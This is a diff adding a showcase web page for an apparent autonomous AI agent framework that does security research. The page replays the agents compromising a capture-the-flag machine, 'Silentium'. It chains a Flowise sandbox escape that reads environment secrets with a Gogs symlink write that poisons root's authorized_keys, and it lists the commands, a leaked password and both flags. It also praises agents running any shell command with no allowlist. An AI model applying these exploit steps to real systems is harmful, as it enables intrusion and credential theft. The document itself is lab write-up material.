@@ -1,0 +1,441 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>nino-harness — AI-Native Agent Framework · el-niño</title>
+<meta name="description" content="nino-harness: an AI-native IRC-style agent framework for autonomous security research. Multi-model orchestration, evidence-gated cycles, real exploit execution.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#0b0c10; --surface:#12141a; --surface-2:#1a1d26;
+  --border:#1f2230; --border-2:#2a2e40;
+  --ink:#e8eaf0; --ink-2:#a0a8c0; --muted:#5a6080;
+  --accent:#7c3aed; --accent-soft:rgba(124,58,237,.12); --accent-glow:rgba(124,58,237,.25);
+  --green:#10b981; --green-soft:rgba(16,185,129,.12);
+  --cyan:#06b6d4; --yellow:#f59e0b; --pink:#ec4899;
+  --claw:#bf5af2; --work:#30d158; --nemo:#64d2ff; --cla:#ffd60a;
+  --mono:'JetBrains Mono',ui-monospace,monospace;
+  --sans:'Inter',-apple-system,sans-serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{background:var(--bg);color:var(--ink);font-family:var(--sans);font-size:16px;line-height:1.6;
+  -webkit-font-smoothing:antialiased;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+canvas#bg{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.5}
+.wrap{position:relative;z-index:1;max-width:1060px;margin:0 auto;padding:0 28px 120px}
+
+/* NAV */
+nav{display:flex;align-items:center;justify-content:space-between;padding:22px 0;
+  border-bottom:1px solid var(--border)}
+.nav-brand{display:flex;align-items:center;gap:10px;font-family:var(--mono);font-size:13px;color:var(--ink-2)}
+.diamond{width:9px;height:9px;border:1.5px solid var(--accent);transform:rotate(45deg);flex-shrink:0}
+.nav-links{display:flex;gap:24px;font-family:var(--mono);font-size:12px;color:var(--muted)}
+.nav-links a:hover{color:var(--ink)}
+
+/* HERO */
+.hero{padding:80px 0 60px;border-bottom:1px solid var(--border)}
+.hero-tag{font-family:var(--mono);font-size:11px;letter-spacing:.18em;text-transform:uppercase;
+  color:var(--accent);margin-bottom:20px;display:flex;align-items:center;gap:8px}
+.hero-tag::before{content:"";width:24px;height:1px;background:var(--accent)}
+h1{font-size:clamp(48px,9vw,96px);font-weight:800;letter-spacing:-.04em;line-height:.9;
+  margin-bottom:28px;background:linear-gradient(135deg,var(--ink) 0%,var(--ink-2) 100%);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+h1 .accent{background:linear-gradient(135deg,var(--accent),var(--claw));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero-lede{font-size:18px;color:var(--ink-2);max-width:54ch;line-height:1.65;margin-bottom:36px}
+.hero-lede b{color:var(--ink)}
+.pills{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:48px}
+.pill{font-family:var(--mono);font-size:11px;letter-spacing:.08em;text-transform:uppercase;
+  border:1px solid var(--border-2);border-radius:2px;padding:5px 12px;color:var(--ink-2)}
+.pill.a{border-color:var(--accent);color:var(--accent);background:var(--accent-soft)}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--border);
+  border:1px solid var(--border);border-radius:4px;overflow:hidden}
+.stat{background:var(--surface);padding:20px 22px}
+.stat .n{font-size:36px;font-weight:800;letter-spacing:-.03em;color:var(--ink);line-height:1;font-family:var(--mono)}
+.stat .l{font-family:var(--mono);font-size:11px;color:var(--muted);margin-top:6px;text-transform:uppercase;letter-spacing:.08em}
+
+/* SECTIONS */
+.sect{margin-top:80px}
+h2{font-size:32px;font-weight:700;letter-spacing:-.025em;margin-bottom:14px}
+.eyebrow{font-family:var(--mono);font-size:11px;letter-spacing:.18em;text-transform:uppercase;
+  color:var(--muted);margin-bottom:12px;display:flex;align-items:center;gap:10px}
+.eyebrow::after{content:"";flex:1;height:1px;background:var(--border)}
+.lead{color:var(--ink-2);max-width:64ch;line-height:1.65}
+
+/* IRC TERMINAL */
+.term-wrap{margin-top:32px;border-radius:6px;overflow:hidden;border:1px solid var(--border);
+  box-shadow:0 24px 64px rgba(0,0,0,.7)}
+.term-bar{background:var(--surface-2);padding:12px 18px;display:flex;align-items:center;gap:8px;
+  border-bottom:1px solid var(--border)}
+.dot{width:10px;height:10px;border-radius:50%}
+.dot.r{background:#ff5f56}.dot.y{background:#ffbd2e}.dot.g{background:#27c93f}
+.t-title{font-family:var(--mono);font-size:12px;color:var(--muted);margin:0 auto}
+.term-body{background:#0d0e14;padding:20px 22px;font-family:var(--mono);font-size:13px;
+  line-height:1.85;min-height:380px;max-height:500px;overflow-y:auto}
+.irc-line{display:flex;gap:0;margin-bottom:2px;opacity:0;transform:translateY(4px);transition:opacity .35s,transform .35s}
+.irc-line.show{opacity:1;transform:none}
+.ts{color:var(--muted);min-width:52px;font-size:11px;padding-top:1px}
+.nick{min-width:120px;font-weight:700;padding-right:10px}
+.nick.claw{color:var(--claw)}.nick.work{color:var(--work)}
+.nick.nemo{color:var(--nemo)}.nick.cla{color:var(--cla)}.nick.sys{color:var(--muted)}
+.msg{color:var(--ink-2);flex:1}
+.msg .ok{color:var(--green);font-weight:600}
+.msg .cmd{color:var(--cyan);font-size:12px}
+.msg .flag{color:var(--pink);font-weight:700;letter-spacing:.04em}
+.msg .warn{color:var(--yellow)}
+.blink{display:inline-block;width:8px;height:14px;background:var(--accent);vertical-align:middle;
+  animation:blink .9s step-end infinite;margin-left:3px}
+@keyframes blink{50%{opacity:0}}
+
+/* ROSTER */
+.roster{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:1px;
+  background:var(--border);border:1px solid var(--border);border-radius:4px;overflow:hidden;margin-top:28px}
+.agent{background:var(--surface);padding:24px;transition:background .15s}
+.agent:hover{background:var(--surface-2)}
+.agent-dot{width:8px;height:8px;border-radius:50%;margin-bottom:14px}
+.agent-key{font-family:var(--mono);font-size:11px;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);margin-bottom:4px}
+.agent-name{font-size:18px;font-weight:700;margin-bottom:3px;letter-spacing:-.01em}
+.agent-zh{font-family:var(--mono);font-size:12px;color:var(--muted);margin-bottom:12px}
+.agent-role{font-size:13.5px;color:var(--ink-2);line-height:1.55}
+.agent-model{font-family:var(--mono);font-size:11px;color:var(--muted);margin-top:12px;
+  border-top:1px solid var(--border);padding-top:10px}
+
+/* PIPELINE */
+.pipe{margin-top:32px;border:1px solid var(--border);border-radius:4px;overflow:hidden}
+.pipe-row{display:flex;align-items:flex-start;background:var(--surface);border-bottom:1px solid var(--border);transition:background .15s}
+.pipe-row:last-child{border-bottom:none}
+.pipe-row:hover{background:var(--surface-2)}
+.p-n{font-family:var(--mono);font-size:10px;color:var(--muted);min-width:40px;padding:18px 0 18px 20px;letter-spacing:.06em}
+.p-name{font-family:var(--mono);font-size:12px;font-weight:700;color:var(--accent);min-width:160px;padding:18px 16px;border-right:1px solid var(--border)}
+.p-desc{font-size:13.5px;color:var(--ink-2);padding:18px 20px;line-height:1.55;flex:1}
+.p-badge{font-family:var(--mono);font-size:10px;border:1px solid var(--border-2);border-radius:2px;
+  padding:3px 8px;color:var(--muted);white-space:nowrap;align-self:center;margin-right:16px;flex-shrink:0}
+
+/* TOOLS */
+.tools{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1px;
+  background:var(--border);border:1px solid var(--border);border-radius:4px;overflow:hidden;margin-top:28px}
+.tool{background:var(--surface);padding:20px 22px;transition:background .15s}
+.tool:hover{background:var(--surface-2)}
+.tool-icon{font-size:20px;margin-bottom:10px}
+.tool-name{font-family:var(--mono);font-size:13px;font-weight:700;color:var(--ink);margin-bottom:4px}
+.tool-desc{font-size:13px;color:var(--ink-2);line-height:1.5}
+
+/* CASE STUDY */
+.case{margin-top:28px;border:1px solid var(--border);border-radius:4px;overflow:hidden}
+.case-hd{background:var(--surface);padding:20px 24px;border-bottom:1px solid var(--border);
+  display:flex;align-items:center;justify-content:space-between;gap:16px}
+.case-tag{font-family:var(--mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;
+  color:var(--green);background:var(--green-soft);border:1px solid rgba(16,185,129,.2);border-radius:2px;padding:3px 9px}
+.case-title{font-size:22px;font-weight:700;letter-spacing:-.02em}
+.case-body{background:var(--surface);padding:20px 24px}
+.chain{font-family:var(--mono);font-size:12.5px;line-height:1.9;color:var(--ink-2);
+  background:#0d0e14;border-radius:3px;padding:16px 20px;margin:12px 0;white-space:pre;overflow-x:auto}
+.chain b{color:var(--ink)}.chain .c{color:var(--accent)}
+.case-meta{display:flex;gap:24px;flex-wrap:wrap;margin-top:16px}
+.kv{display:flex;flex-direction:column;gap:3px}
+.kv .k{font-family:var(--mono);font-size:10.5px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+.kv .v{font-family:var(--mono);font-size:13px;color:var(--ink)}
+.kv .v.flag{color:var(--pink)}
+.read-btn{display:inline-flex;align-items:center;gap:6px;margin-top:18px;
+  font-family:var(--mono);font-size:12px;color:var(--accent);border:1px solid var(--accent);
+  border-radius:2px;padding:7px 16px;transition:background .15s}
+.read-btn:hover{background:var(--accent-soft)}
+
+/* STACK */
+.stack-code{background:var(--surface);border:1px solid var(--border);border-radius:4px;
+  padding:20px 24px;font-family:var(--mono);font-size:13px;line-height:2;color:var(--ink-2);margin-top:24px}
+
+/* FOOTER */
+footer{margin-top:80px;padding-top:28px;border-top:1px solid var(--border);
+  font-family:var(--mono);font-size:12px;color:var(--muted);line-height:1.8;
+  display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:16px}
+footer a{color:var(--accent)}
+
+@media(max-width:700px){
+  .stats{grid-template-columns:1fr 1fr}
+  .p-name{min-width:100px}
+  .nav-links{display:none}
+}
+</style>
+</head>
+<body>
+<canvas id="bg"></canvas>
+<div class="wrap">
+
+  <nav>
+    <div class="nav-brand"><span class="diamond"></span>nino-harness</div>
+    <div class="nav-links">
+      <a href="../">← machines</a>
+      <a href="#agents">agents</a>
+      <a href="#pipeline">pipeline</a>
+      <a href="#case">case study</a>
+    </div>
+  </nav>
+
+  <section class="hero">
+    <div class="hero-tag">AI-Native Agent Framework</div>
+    <h1>nino-<span class="accent">harness</span></h1>
+    <p class="hero-lede">
+      An <b>IRC-style multi-agent loop</b> for autonomous security research.
+      Specialized models plan, reason, execute, and review — closing the loop
+      with <b>real shell output</b>, not suggestions.
+    </p>
+    <div class="pills">
+      <span class="pill a">Multi-Model Orchestration</span>
+      <span class="pill">Evidence-Gated Cycles</span>
+      <span class="pill">KVM Shell Execution</span>
+      <span class="pill">Obsidian Vault Logging</span>
+      <span class="pill">WebSocket IRC Channel</span>
+    </div>
+    <div class="stats">
+      <div class="stat"><div class="n" data-count="8">0</div><div class="l">Machines Owned</div></div>
+      <div class="stat"><div class="n" data-count="4">0</div><div class="l">Active Agents</div></div>
+      <div class="stat"><div class="n" data-count="3">0</div><div class="l">LLM Backends</div></div>
+      <div class="stat"><div class="n" data-count="9">0</div><div class="l">Pipeline Stages</div></div>
+    </div>
+  </section>
+
+  <!-- IRC DEMO -->
+  <section class="sect" id="demo">
+    <div class="eyebrow">live channel · #silentium</div>
+    <h2>Agents in the channel</h2>
+    <p class="lead">The IRC channel is the harness' shared workspace. Every agent speaks, reasons, and acts in sequence — all decisions visible in real time. Replay from the Silentium engagement.</p>
+    <div class="term-wrap">
+      <div class="term-bar">
+        <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+        <span class="t-title">nino-harness · #silentium · 10.129.245.103</span>
+      </div>
+      <div class="term-body" id="irc"></div>
+    </div>
+  </section>
+
+  <!-- AGENTS -->
+  <section class="sect" id="agents">
+    <div class="eyebrow">roster · 四个代理人</div>
+    <h2>Agent Roster</h2>
+    <p class="lead">Each agent is a distinct model with a fixed role. No agent acts outside its domain — the harness enforces role boundaries through the message protocol.</p>
+    <div class="roster">
+      <div class="agent">
+        <div class="agent-dot" style="background:var(--claw)"></div>
+        <div class="agent-key">claw</div>
+        <div class="agent-name" style="color:var(--claw)">Gemini</div>
+        <div class="agent-zh">双子座 · 规划者</div>
+        <div class="agent-role">Decomposes objectives into 3–5 concrete, self-contained tasks. Sets the rail for each cycle. Never executes — only plans.</div>
+        <div class="agent-model">gemini-2.5-pro · Planner</div>
+      </div>
+      <div class="agent">
+        <div class="agent-dot" style="background:var(--work)"></div>
+        <div class="agent-key">work</div>
+        <div class="agent-name" style="color:var(--work)">Dolphin</div>
+        <div class="agent-zh">海豚 · 牧羊人</div>
+        <div class="agent-role">Generates hypotheses, reasons about evidence, and reviews closure. The Shepherd builds context — it does not act on the target directly.</div>
+        <div class="agent-model">dolphin-venice · Shepherd / Reviewer</div>
+      </div>
+      <div class="agent">
+        <div class="agent-dot" style="background:var(--nemo)"></div>
+        <div class="agent-key">nemo</div>
+        <div class="agent-name" style="color:var(--nemo)">Hermes</div>
+        <div class="agent-zh">赫尔墨斯 · 执行者</div>
+        <div class="agent-role">Runs shell commands, calls tools, and reads raw output. Hermes is the only agent that touches the target. Evidence flows back through its hands.</div>
+        <div class="agent-model">hermes3:8b · Executor</div>
+      </div>
+      <div class="agent">
+        <div class="agent-dot" style="background:var(--cla)"></div>
+        <div class="agent-key">cla</div>
+        <div class="agent-name" style="color:var(--cla)">Codex</div>
+        <div class="agent-zh">科德克斯 · 评审者</div>
+        <div class="agent-role">Reviews artifacts against the objective, names blockers, and decides phase advancement. The Reviewer closes or escalates each cycle.</div>
+        <div class="agent-model">claude-sonnet-4-5 · Reviewer</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- PIPELINE -->
+  <section class="sect" id="pipeline">
+    <div class="eyebrow">cycle pipeline · loop_once()</div>
+    <h2>Evidence Cycle</h2>
+    <p class="lead">Each cycle runs nine deterministic stages. Evidence gates at 6b prevent a failed command from being logged as a finding. A 3-strike blocker triggers voice warnings and automatic avoidance injection.</p>
+    <div class="pipe">
+      <div class="pipe-row"><span class="p-n">01</span><span class="p-name">Snapshot</span><span class="p-desc">engagement.snapshot() reads current phase, findings count, and blocker history from Redis. Seeds the context window.</span><span class="p-badge">redis</span></div>
+      <div class="pipe-row"><span class="p-n">02</span><span class="p-name">Target Map</span><span class="p-desc">process_memory.attach_to_map() loads running services, known credentials, and paths discovered in previous cycles.</span><span class="p-badge">state</span></div>
+      <div class="pipe-row"><span class="p-n">03</span><span class="p-name">Hypotheses</span><span class="p-desc">reason_hypotheses() generates 2–4 attack hypotheses. Dolphin feeds on findings + recent cycles + writeup context to reason forward.</span><span class="p-badge">dolphin</span></div>
+      <div class="pipe-row"><span class="p-n">04</span><span class="p-name">Research</span><span class="p-desc">plan_research() + run_research() queries DuckDuckGo and reads pages for CVE details, service versions, and exploit patterns.</span><span class="p-badge">web</span></div>
+      <div class="pipe-row"><span class="p-n">05</span><span class="p-name">Decision</span><span class="p-desc">choose_decision() selects the next action + command. Injects all previously failed commands and repeated blockers to force avoidance.</span><span class="p-badge">hermes</span></div>
+      <div class="pipe-row"><span class="p-n">06</span><span class="p-name">Execution</span><span class="p-desc">execute_decision() runs shell_exec / web_search / context_exec. Returns raw artifact + duration. All commands allowed — no blocklist.</span><span class="p-badge">shell</span></div>
+      <div class="pipe-row"><span class="p-n">6b</span><span class="p-name">Closure Gate</span><span class="p-desc">evidence_gates.assess_cycle() deterministically checks artifact patterns. Must match expected evidence before the cycle logs a finding.</span><span class="p-badge">gate</span></div>
+      <div class="pipe-row"><span class="p-n">6c</span><span class="p-name">Recovery</span><span class="p-desc">record_blockers() fingerprints failures. 2× repeat → voice warning + avoidance injection. 3× → TERMINAL_BLOCK → mission paused.</span><span class="p-badge">safety</span></div>
+      <div class="pipe-row"><span class="p-n">07–08</span><span class="p-name">Map + Record</span><span class="p-desc">update_map() extracts services, paths, creds. engagement.log_cycle() + vault.log_full_cycle() persist to Redis and Obsidian vault.</span><span class="p-badge">vault</span></div>
+    </div>
+  </section>
+
+  <!-- TOOLS -->
+  <section class="sect">
+    <div class="eyebrow">tool surface · tools.py</div>
+    <h2>Four Tools</h2>
+    <p class="lead">Agents are restricted to four primitives. Everything the harness can do flows through one of these — making the execution envelope explicit and auditable.</p>
+    <div class="tools">
+      <div class="tool"><div class="tool-icon">⚡</div><div class="tool-name">shell_exec</div><div class="tool-desc">Runs any shell command locally. No allowlist. 60s timeout. Full stdout/stderr. Used by Hermes for all target interaction.</div></div>
+      <div class="tool"><div class="tool-icon">🌐</div><div class="tool-name">web_search</div><div class="tool-desc">DuckDuckGo HTML scrape. 5s rate limit. Used for CVE research, exploit PoC hunting, and service fingerprint lookup.</div></div>
+      <div class="tool"><div class="tool-icon">📄</div><div class="tool-name">web_read</div><div class="tool-desc">Fetch + text-extract a URL. Strips HTML, returns clean prose. Reads exploit docs, GitHub source, NVD advisories.</div></div>
+      <div class="tool"><div class="tool-icon">🔗</div><div class="tool-name">context_exec</div><div class="tool-desc">SSH / container / K8s context routing. Runs commands on remote targets via registered execution contexts.</div></div>
+    </div>
+  </section>
+
+  <!-- CASE STUDY -->
+  <section class="sect" id="case">
+    <div class="eyebrow">case study · Silentium · Hard</div>
+    <h2>From mission start to root</h2>
+    <p class="lead">The harness ran autonomously against Silentium — discovering services, enumerating attack surface, chaining two CVEs, and capturing both flags. Human intervention: credential guess + reading one captcha.</p>
+    <div class="case">
+      <div class="case-hd">
+        <div>
+          <div class="case-title">Silentium</div>
+          <div style="font-family:var(--mono);font-size:12px;color:var(--muted);margin-top:4px">10.129.245.103 · Linux · Hard · Flowise 3.0.5 + Gogs 0.13.x</div>
+        </div>
+        <span class="case-tag">fully owned</span>
+      </div>
+      <div class="case-body">
+        <div class="chain">nmap → nginx/80 → <b>staging.silentium.htb</b> → Flowise 3.0.5
+  └─ POST /api/v1/<b class="c">node-custom-function</b>  [<b>CVE-2025-59528</b>]
+       └─ NodeVM blocked child_process/fs → harness tried 7 escape vectors
+            └─ <b>LangChain TextLoader</b> uses real fs internally → bypass confirmed
+                 └─ read /proc/self/environ → <b>SMTP_PASSWORD=r04D!!_R4ge</b>
+                      └─ SSH as ben → <b class="c">user.txt ✓</b>
+
+nginx → <b>staging-v2-code.dev.silentium.htb</b> → Gogs (<b>User=root</b>)
+  └─ open registration + image captcha (solved: 499699)
+       └─ git commit mode 120000 symlink → /root/.ssh/authorized_keys
+            └─ PUT PutContents API  [<b>CVE-2025-8110</b>]
+                 └─ Gogs follows symlink, writes attacker pubkey as root
+                      └─ SSH root → <b class="c">root.txt ✓</b></div>
+        <div class="case-meta">
+          <div class="kv"><span class="k">user flag</span><span class="v flag">53074d6f173dcb4f7b5bc71fa856dc6b</span></div>
+          <div class="kv"><span class="k">root flag</span><span class="v flag">17f1542df105a6646b6ac6efff76b9cc</span></div>
+          <div class="kv"><span class="k">session</span><span class="v">~5 h · 13 Jul 2026</span></div>
+          <div class="kv"><span class="k">cycles</span><span class="v">47+ evidence cycles</span></div>
+        </div>
+        <a class="read-btn" href="../silentium/">Read full writeup →</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- STACK -->
+  <section class="sect">
+    <div class="eyebrow">stack · architecture</div>
+    <h2>How it's built</h2>
+    <p class="lead">Python FastAPI on 8787. React + WebSocket IRC frontend. Redis for engagement state. Obsidian-compatible vault for all evidence and reasoning logs.</p>
+    <div class="stack-code">
+      <span style="color:var(--muted)"># backend</span><br>
+      <span style="color:var(--accent)">FastAPI</span> + uvicorn · port 8787 · WebSocket /ws<br>
+      <span style="color:var(--accent)">Redis</span> · engagement state · findings · cycle history<br>
+      <span style="color:var(--accent)">Celery</span> · async task queue (optional)<br><br>
+      <span style="color:var(--muted)"># llm routing</span><br>
+      <span style="color:var(--work)">Dolphin Venice</span> · Ollama · Shepherd + Worker roles<br>
+      <span style="color:var(--nemo)">Hermes 3 8B</span> · Ollama · Executor decisions<br>
+      <span style="color:var(--cla)">Claude Sonnet</span> · CLI auth · Reviewer + Feedback<br>
+      <span style="color:var(--claw)">Gemini 2.5 Pro</span> · CLI auth · Planner + Steering<br><br>
+      <span style="color:var(--muted)"># frontend</span><br>
+      <span style="color:var(--accent)">React</span> + Vite · IRC / Queue / Terminal / Vault / Debug panels<br>
+      <span style="color:var(--accent)">Obsidian vault</span> · per-engagement Markdown + JSONL debug stream
+    </div>
+  </section>
+
+  <footer>
+    <div>nino-harness · autonomous agent framework for sanctioned security research<br>
+    <a href="https://github.com/Ch-i/nino-harness" target="_blank">github.com/Ch-i/nino-harness</a> · <a href="../">el-niño writeups</a></div>
+    <div style="text-align:right">Built by ssephi<br>KVM · all commands allowed</div>
+  </footer>
+</div>
+
+<script>
+/* backdrop */
+(function(){
+  const c=document.getElementById('bg'),x=c.getContext('2d');let W,H;
+  function size(){W=c.width=innerWidth*devicePixelRatio;H=c.height=innerHeight*devicePixelRatio;draw();}
+  function draw(){
+    x.clearRect(0,0,W,H);const d=devicePixelRatio;
+    x.strokeStyle='rgba(124,58,237,.055)';x.lineWidth=1*d;
+    for(let gx=0;gx<W;gx+=140*d){x.beginPath();x.moveTo(gx,0);x.lineTo(gx,H);x.stroke();}
+    for(let gy=0;gy<H;gy+=140*d){x.beginPath();x.moveTo(0,gy);x.lineTo(W,gy);x.stroke();}
+    x.strokeStyle='rgba(124,58,237,.08)';x.lineWidth=1.2*d;
+    const ring=(cx,cy,rot,n)=>{for(let i=0;i<n;i++){x.globalAlpha=0.55-i*0.06;
+      x.beginPath();x.ellipse(cx,cy,(60+i*55)*d,(40+i*38)*d,rot,0,7);x.stroke();}};
+    ring(W*.85,H*.12,-.4,8);ring(W*.08,H*.82,.3,6);x.globalAlpha=1;
+  }
+  addEventListener('resize',size);size();
+})();
+
+/* counter */
+(function(){
+  const els=document.querySelectorAll('[data-count]');
+  const obs=new IntersectionObserver(es=>{es.forEach(e=>{
+    if(!e.isIntersecting)return;
+    const el=e.target,t=+el.dataset.count,dur=1200,s=performance.now();
+    (function f(now){const p=Math.min((now-s)/dur,1);el.textContent=Math.round(p*p*(3-2*p)*t);
+    if(p<1)requestAnimationFrame(f);})(performance.now());obs.unobserve(el);
+  });},{threshold:.5});
+  els.forEach(el=>obs.observe(el));
+})();
+
+/* irc replay */
+(function(){
+  const L=[
+    {ts:'15:15',n:'',c:'sys',m:'🔴 Mission started · target: 10.129.245.103 · objective: user.txt + root.txt'},
+    {ts:'15:16',n:'claw',c:'claw',m:'Rail entered · recon.initial_scan · nmap -p22,80 -sCV 10.129.245.103'},
+    {ts:'15:18',n:'nemo',c:'nemo',m:'⚡ shell_exec: nmap -p22,80,8080 -sCV 10.129.245.103'},
+    {ts:'15:19',n:'nemo',c:'nemo',m:'→ 22/tcp open ssh OpenSSH 9.x · 80/tcp open http nginx/1.24.0 (Ubuntu)'},
+    {ts:'15:21',n:'work',c:'work',m:'Recon verified. nginx on 80, SSH on 22. Hypothesis: multiple vhosts — running ffuf enum'},
+    {ts:'15:23',n:'nemo',c:'nemo',m:'⚡ ffuf -w subdomains-top5000.txt -H "Host: FUZZ.silentium.htb" -u http://10.129.245.103/'},
+    {ts:'15:24',n:'nemo',c:'nemo',m:'→ <span class="ok">staging.silentium.htb [200]</span> · staging-v2-code.dev.silentium.htb [200]'},
+    {ts:'15:26',n:'cla',c:'cla',m:'Evidence: 2 vhosts confirmed. Phase: recon → foothold. Next: identify services on both vhosts.'},
+    {ts:'16:39',n:'nemo',c:'nemo',m:'⚡ curl -s http://staging.silentium.htb/api/v1/version'},
+    {ts:'16:39',n:'nemo',c:'nemo',m:'→ <span class="ok">{"version":"3.0.5"}</span> — Flowise 3.0.5 identified'},
+    {ts:'16:40',n:'work',c:'work',m:'Flowise 3.0.5 — checking CVE database for authenticated RCE vectors...'},
+    {ts:'16:41',n:'nemo',c:'nemo',m:'⚡ web_search: "Flowise 3.0.5 CVE RCE node-custom-function 2025"'},
+    {ts:'16:42',n:'nemo',c:'nemo',m:'→ <span class="warn">CVE-2025-59528</span> · /api/v1/node-custom-function JS exec via NodeVM (authenticated)'},
+    {ts:'18:57',n:'nemo',c:'nemo',m:'⚡ POST /api/v1/node-custom-function {javascriptFunction:"return \\"hello\\""} '},
+    {ts:'18:57',n:'nemo',c:'nemo',m:'→ <span class="ok">"hello" ✓</span> · CVE-2025-59528 confirmed. Sandbox escape next.'},
+    {ts:'19:17',n:'work',c:'work',m:'NodeVM analysis: require("child_process") blocked · require("fs") blocked · eval disabled'},
+    {ts:'19:17',n:'work',c:'work',m:'Trying escape vectors: Function constructor... global.process... TypeORM... all blocked.'},
+    {ts:'19:34',n:'work',c:'work',m:'Vector 6: LangChain TextLoader — <span class="ok">permitted in allowlist</span>. Uses native fs internally.'},
+    {ts:'19:47',n:'nemo',c:'nemo',m:'⚡ new TextLoader("/proc/self/environ").load() via NodeVM'},
+    {ts:'19:47',n:'nemo',c:'nemo',m:'→ <span class="ok">BYPASS CONFIRMED</span> · running as root in container (c78c3cceb7ba)'},
+    {ts:'19:48',n:'nemo',c:'nemo',m:'→ <span class="warn">SMTP_PASSWORD=r04D!!_R4ge</span> · FLOWISE_USERNAME=ben'},
+    {ts:'19:48',n:'nemo',c:'nemo',m:"⚡ sshpass -p 'r04D!!_R4ge' ssh ben@10.129.245.103 \"cat ~/user.txt\""},
+    {ts:'19:48',n:'',c:'sys',m:'🏴 <span class="flag">user.txt: 53074d6f173dcb4f7b5bc71fa856dc6b</span>'},
+    {ts:'19:50',n:'claw',c:'claw',m:'Phase: foothold → escalation. Rail: host enum + privesc. Port scan host from container...'},
+    {ts:'19:51',n:'nemo',c:'nemo',m:'→ docker gateway 172.18.0.1:22,80,3001 · Gogs on host :3001 (nginx proxied)'},
+    {ts:'19:52',n:'nemo',c:'nemo',m:'⚡ cat /etc/systemd/system/gogs.service'},
+    {ts:'19:52',n:'nemo',c:'nemo',m:'→ <span class="warn">User=root</span> — Gogs runs as root · /opt/gogs/data/gogs.db · registration open'},
+    {ts:'20:05',n:'work',c:'work',m:'Gogs 0.13.x + User=root + open registration = CVE-2025-8110 viable. Symlink overwrite.'},
+    {ts:'20:10',n:'nemo',c:'nemo',m:'⚡ curl gogs/user/sign_up · captcha_id=Cawv5p · captcha=499699 → <span class="ok">302 registered</span>'},
+    {ts:'20:11',n:'nemo',c:'nemo',m:'⚡ git commit mode 120000 symlink_payload → /root/.ssh/authorized_keys · pushed'},
+    {ts:'20:12',n:'nemo',c:'nemo',m:'⚡ PUT /api/v1/repos/hacker/exploit/contents/symlink_payload {content: pubkey_b64}'},
+    {ts:'20:12',n:'nemo',c:'nemo',m:'→ <span class="ok">200 OK</span> · Gogs wrote through symlink — authorized_keys poisoned ✓'},
+    {ts:'20:12',n:'nemo',c:'nemo',m:'⚡ ssh -i exploit_key root@10.129.245.103 "cat /root/root.txt"'},
+    {ts:'20:12',n:'',c:'sys',m:'🏴 <span class="flag">root.txt: 17f1542df105a6646b6ac6efff76b9cc</span>'},
+    {ts:'20:12',n:'cla',c:'cla',m:'Mission complete. Phase: root. Evidence verified. Generating vault report + writeup.'},
+  ];
+  const el=document.getElementById('irc');let i=0;
+  function add(){
+    if(i>=L.length)return;
+    const l=L[i++];
+    const d=document.createElement('div');d.className='irc-line';
+    d.innerHTML=`<span class="ts">${l.ts}</span><span class="nick ${l.c}">${l.n?'&lt;'+l.n+'&gt;':''}</span><span class="msg">${l.m}</span>`;
+    el.appendChild(d);requestAnimationFrame(()=>d.classList.add('show'));
+    el.scrollTop=el.scrollHeight;
+    const delay=l.c==='sys'?800:Math.random()*500+150;
+    if(i<L.length)setTimeout(add,delay);
+    else{const cur=document.createElement('div');cur.className='irc-line show';
+      cur.innerHTML='<span class="ts"></span><span class="nick sys">▶</span><span class="msg"><span class="blink"></span></span>';
+      el.appendChild(cur);}
+  }
+  const obs=new IntersectionObserver(es=>{if(es[0].isIntersecting&&i===0){setTimeout(add,400);obs.disconnect();}},{threshold:.25});
+  obs.observe(el);
+})();
+</script>
+</body>
+</html>
